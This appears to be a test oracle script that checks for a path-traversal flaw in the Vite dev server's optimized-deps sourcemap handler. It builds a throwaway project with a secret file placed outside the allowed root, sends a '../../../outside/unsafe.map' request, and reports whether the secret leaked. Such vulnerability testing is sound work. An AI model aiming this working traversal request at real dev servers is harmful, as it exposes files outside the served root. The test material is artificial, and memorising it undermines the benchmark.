'use strict';
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

function send(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function makeRequest(server, reqUrl) {
  return new Promise((resolve) => {
    let statusCode = 200;
    let body = '';
    let settled = false;
    const safeResolve = (v) => {
      if (!settled) {
        settled = true;
        resolve(v);
      }
    };
    const req = {
      url: reqUrl,
      originalUrl: reqUrl,
      method: 'GET',
      headers: { host: 'localhost' },
      on() {},
      socket: {},
    };
    const res = {
      setHeader() {},
      getHeader() { return undefined; },
      removeHeader() {},
      hasHeader() { return false; },
      writeHead(code) { statusCode = code; },
      write(chunk) { if (chunk) body += chunk.toString(); },
      end(chunk) {
        if (chunk) body += chunk.toString();
        safeResolve({ statusCode, body });
      },
      get statusCode() { return statusCode; },
      set statusCode(v) { statusCode = v; },
    };
    try {
      server.middlewares(req, res, (err) => {
        if (err) {
          safeResolve({ statusCode: statusCode && statusCode !== 200 ? statusCode : 500, body: body || String(err && err.message) });
        } else {
          safeResolve({ statusCode: statusCode || 404, body });
        }
      });
    } catch (e) {
      safeResolve({ statusCode: 500, body: String(e && e.message) });
    }
    setTimeout(() => safeResolve({ statusCode: statusCode || 0, body }), 5000);
  });
}

async function main() {
  let vite;
  try {
    vite = require('vite');
  } catch (e) {
    send({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
    return;
  }

  const marker = 'vite_oracle_' + Date.now() + '_' + Math.random().toString(36).slice(2);
  const baseDir = path.join(os.tmpdir(), marker);
  const projectRoot = path.join(baseDir, 'project');
  const depsDir = path.join(projectRoot, 'node_modules', '.vite', 'deps');
  const outsideDir = path.join(baseDir, 'outside');

  let operation_completed = false;
  let server;

  try {
    fs.mkdirSync(depsDir, { recursive: true });
    fs.mkdirSync(outsideDir, { recursive: true });
    fs.mkdirSync(path.join(projectRoot, 'src'), { recursive: true });

    // A legitimate optimized dependency chunk + its map file inside the
    // optimized deps dir, registered in _metadata.json so depsOptimizer
    // recognizes it via isOptimizedDepFile().
    const legitChunkPath = path.join(depsDir, 'legit-chunk.js');
    fs.writeFileSync(legitChunkPath, 'export const x = 1;\n//# sourceMappingURL=legit-chunk.js.map', 'utf-8');
    const legitMapPath = path.join(depsDir, 'legit-chunk.js.map');
    const legitMapContent = JSON.stringify({ version: 3, sources: ['legit.js'], mappings: '', names: [] });
    fs.writeFileSync(legitMapPath, legitMapContent, 'utf-8');

    const metadataPath = path.join(depsDir, '_metadata.json');
    fs.writeFileSync(metadataPath, JSON.stringify({
      hash: 'abc123',
      browserHash: 'def456',
      optimized: {
        'legit-chunk': {
          src: 'legit-chunk',
          file: legitChunkPath,
          fileHash: 'hash1',
          needsInterop: false,
        },
      },
      chunks: {},
    }), 'utf-8');

    // A secret file OUTSIDE the project root, ending in .map, parseable JSON,
    // reachable via traversal from the deps dir.
    const secretMarkerValue = 'SECRET_' + marker;
    const secretMapPath = path.join(outsideDir, 'unsafe.map');
    fs.writeFileSync(secretMapPath, JSON.stringify({ key: secretMarkerValue }), 'utf-8');

    // minimal index.html so Vite root is valid
    fs.writeFileSync(path.join(projectRoot, 'index.html'), '<html><body></body></html>', 'utf-8');
    fs.writeFileSync(path.join(projectRoot, 'src', 'main.js'), 'export const x = 1;', 'utf-8');

    server = await vite.createServer({
      root: projectRoot,
      logLevel: 'silent',
      configFile: false,
      server: {
        middlewareMode: true,
        fs: { strict: true, allow: [projectRoot] },
      },
      optimizeDeps: { noDiscovery: true, include: [] },
      appType: 'custom',
    });

    // Ensure the deps optimizer metadata/scan is initialized so
    // isOptimizedDepFile() recognizes files inside depsDir.
    try {
      if (typeof server.pluginContainer?.buildStart === 'function') {
        await server.pluginContainer.buildStart({});
      }
    } catch (e) {
      // ignore; not required for request handling
    }

    // Benign request: fetch the dependency chunk's own sourcemap, which should
    // work normally through the optimized-deps sourcemap handler.
    const benignUrl = '/node_modules/.vite/deps/legit-chunk.js.map';
    const benignResp = await makeRequest(server, benignUrl);

    let benignOk = false;
    try {
      const parsed = JSON.parse(benignResp.body);
      benignOk = benignResp.statusCode === 200 && parsed && Array.isArray(parsed.sources) && parsed.sources[0] === 'legit.js';
    } catch (e) {
      benignOk = false;
    }

    if (!benignOk) {
      send({ operation_completed: false, exploit_succeeded: false, evidence: 'benign request to legitimate optimized deps sourcemap failed: status=' + benignResp.statusCode + ' body=' + benignResp.body.slice(0, 200) });
      return;
    }

    operation_completed = true;

    // Malicious request: traverse out of node_modules/.vite/deps to outside/unsafe.map
    // using a request path shape that still matches the optimized-deps sourcemap
    // code path (ends with .map, located under the deps dir prefix as seen by
    // the raw URL) but resolves outside the optimized deps directory once
    // path.resolve collapses the '..' segments.
    const traversalUrlFinal = '/node_modules/.vite/deps/../../../outside/unsafe.map';

    const maliciousResp = await makeRequest(server, traversalUrlFinal);

    let exploit_succeeded = false;
    let evidence;
    if (maliciousResp.statusCode === 200 && maliciousResp.body.includes(secretMarkerValue)) {
      exploit_succeeded = true;
      evidence = 'path traversal succeeded: status=' + maliciousResp.statusCode + ' leaked secret content from outside project root';
    } else {
      exploit_succeeded = false;
      evidence = 'path traversal blocked: status=' + maliciousResp.statusCode + ' body=' + maliciousResp.body.slice(0, 200);
    }

    send({ operation_completed, exploit_succeeded, evidence });
  } catch (e) {
    send({ operation_completed: operation_completed, exploit_succeeded: false, evidence: 'unexpected exception: ' + String(e && e.message) });
  } finally {
    try {
      if (server && typeof server.close === 'function') {
        await server.close();
      }
    } catch (e) {
      // ignore cleanup errors
    }
    try {
      fs.rmSync(baseDir, { recursive: true, force: true });
    } catch (e) {
      // ignore cleanup errors
    }
  }
}

main().catch((e) => {
  send({ operation_completed: false, exploit_succeeded: false, evidence: 'top-level exception: ' + String(e && e.message) });
});
